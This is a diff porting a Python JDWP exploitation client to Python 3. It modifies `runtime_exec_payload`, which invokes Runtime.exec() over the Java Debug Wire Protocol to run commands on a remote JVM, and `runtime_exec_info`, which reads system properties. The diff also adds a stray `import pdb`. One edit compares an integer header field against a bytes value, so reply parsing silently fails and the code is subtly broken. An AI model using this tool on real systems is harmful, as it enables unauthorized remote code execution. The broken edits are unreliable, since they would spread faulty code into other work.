@@ -15,6 +15,7 @@ import struct
 import urllib.request, urllib.parse, urllib.error
 import argparse
 import traceback
+import pdb
 
 
 
@@ -96,7 +97,7 @@ class JDWPClient:
         header = self.socket.recv(11)
         pktlen, id, flags, errcode = struct.unpack(">IIBH", header)
 
-        if flags == REPLY_PACKET_TYPE:
+        if flags == struct.pack(">B", REPLY_PACKET_TYPE):
             if errcode :
                 raise Exception("Received errcode %d" % errcode)
 
@@ -309,6 +310,7 @@ class JDWPClient:
         buf = self.buildstring(data)
         self.socket.sendall( self.create_packet(CREATESTRING_SIG, data=buf) )
         buf = self.read_reply()
+        
         return self.parse_entries(buf, [(self.objectIDSize, "objId")], False)
 
     def buildstring(self, data: bytes):
@@ -494,33 +496,33 @@ def runtime_exec_info(jdwp, threadId):
     # This function calls java.lang.System.getProperties() and
     # displays OS properties (non-intrusive)
     #
-    properties = {"java.version": "Java Runtime Environment version",
-                  "java.vendor": "Java Runtime Environment vendor",
-                  "java.vendor.url": "Java vendor URL",
-                  "java.home": "Java installation directory",
-                  "java.vm.specification.version": "Java Virtual Machine specification version",
-                  "java.vm.specification.vendor": "Java Virtual Machine specification vendor",
-                  "java.vm.specification.name": "Java Virtual Machine specification name",
-                  "java.vm.version": "Java Virtual Machine implementation version",
-                  "java.vm.vendor": "Java Virtual Machine implementation vendor",
-                  "java.vm.name": "Java Virtual Machine implementation name",
-                  "java.specification.version": "Java Runtime Environment specification version",
-                  "java.specification.vendor": "Java Runtime Environment specification vendor",
-                  "java.specification.name": "Java Runtime Environment specification name",
-                  "java.class.version": "Java class format version number",
-                  "java.class.path": "Java class path",
-                  "java.library.path": "List of paths to search when loading libraries",
-                  "java.io.tmpdir": "Default temp file path",
-                  "java.compiler": "Name of JIT compiler to use",
-                  "java.ext.dirs": "Path of extension directory or directories",
-                  "os.name": "Operating system name",
-                  "os.arch": "Operating system architecture",
-                  "os.version": "Operating system version",
-                  "file.separator": "File separator",
-                  "path.separator": "Path separator",
-                  "user.name": "User's account name",
-                  "user.home": "User's home directory",
-                  "user.dir": "User's current working directory"
+    properties = {b"java.version": "Java Runtime Environment version",
+                  b"java.vendor": "Java Runtime Environment vendor",
+                  b"java.vendor.url": "Java vendor URL",
+                  b"java.home": "Java installation directory",
+                  b"java.vm.specification.version": "Java Virtual Machine specification version",
+                  b"java.vm.specification.vendor": "Java Virtual Machine specification vendor",
+                  b"java.vm.specification.name": "Java Virtual Machine specification name",
+                  b"java.vm.version": "Java Virtual Machine implementation version",
+                  b"java.vm.vendor": "Java Virtual Machine implementation vendor",
+                  b"java.vm.name": "Java Virtual Machine implementation name",
+                  b"java.specification.version": "Java Runtime Environment specification version",
+                  b"java.specification.vendor": "Java Runtime Environment specification vendor",
+                  b"java.specification.name": "Java Runtime Environment specification name",
+                  b"java.class.version": "Java class format version number",
+                  b"java.class.path": "Java class path",
+                  b"java.library.path": "List of paths to search when loading libraries",
+                  b"java.io.tmpdir": "Default temp file path",
+                  b"java.compiler": "Name of JIT compiler to use",
+                  b"java.ext.dirs": "Path of extension directory or directories",
+                  b"os.name": "Operating system name",
+                  b"os.arch": "Operating system architecture",
+                  b"os.version": "Operating system version",
+                  b"file.separator": "File separator",
+                  b"path.separator": "Path separator",
+                  b"user.name": "User's account name",
+                  b"user.home": "User's home directory",
+                  b"user.dir": "User's current working directory"
                 }
 
     systemClass = jdwp.get_class_by_name(b"Ljava/lang/System;")
@@ -546,7 +548,7 @@ def runtime_exec_info(jdwp, threadId):
                                 threadId,
                                 getPropertyMeth["methodId"],
                                 *data)
-        if buf[0] != struct.pack(">B", TAG_STRING):
+        if buf[0] != TAG_STRING:
             print(("[-] %s: Unexpected returned type: expecting String" % propStr))
         else:
             retId = jdwp.unformat(jdwp.objectIDSize, buf[1:1+jdwp.objectIDSize])
@@ -573,7 +575,7 @@ def runtime_exec_payload(jdwp, threadId, runtimeClassId, getRuntimeMethId, comma
 
     # 2. use context to get Runtime object
     buf = jdwp.invokestatic(runtimeClassId, threadId, getRuntimeMethId)
-    if buf[0] != struct.pack(">B", TAG_OBJECT):
+    if buf[0] != TAG_OBJECT:
         print ("[-] Unexpected returned type: expecting Object")
         return False
     rt = jdwp.unformat(jdwp.objectIDSize, buf[1:1+jdwp.objectIDSize])
@@ -593,7 +595,7 @@ def runtime_exec_payload(jdwp, threadId, runtimeClassId, getRuntimeMethId, comma
     # 4. call exec() in this context with the alloc-ed string
     data = [ struct.pack(">B", TAG_OBJECT) + jdwp.format(jdwp.objectIDSize, cmdObjId) ]
     buf = jdwp.invoke(rt, threadId, runtimeClassId, execMeth["methodId"], *data)
-    if buf[0] != struct.pack(">B", TAG_OBJECT):
+    if buf[0] != TAG_OBJECT:
         print ("[-] Unexpected returned type: expecting Object")
         return False
 
